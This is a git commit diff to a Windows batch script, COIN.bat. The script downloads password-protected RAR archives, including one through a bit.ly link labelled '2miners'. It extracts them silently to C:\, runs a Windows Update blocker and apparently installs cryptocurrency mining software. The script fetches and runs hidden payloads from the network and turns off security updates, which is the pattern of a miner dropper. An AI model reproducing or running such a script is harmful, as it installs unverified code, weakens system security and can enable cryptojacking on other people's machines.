9b85b70de35c0afa719546a0ada65c2ac9e57422
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2024-12-22 21:35:00 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -7,7 +7,7 @@ powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' 
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/Disable-update-windows.rar -OutFile C:\Disable-update-windows.rar"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -pPITVN -ibck -y 'C:\Disable-update-windows.rar' 'C:\'"
 powershell -NoProfile -Command "Start-Sleep -Seconds 4"
-powershell -NoProfile -Command "Start-Process -FilePath 'C:\Disable-update-windows\Wub_x64.exe' -WindowStyle"
+powershell -NoProfile -Command "& 'C:\Disable-update-windows\Wub_x64.exe'"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/2miners-github -OutFile C:\setup.rar"
 powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners -ibck -y 'C:\setup.rar' 'C:\'"
 powershell -NoProfile -Command "Start-Sleep -Seconds 8"
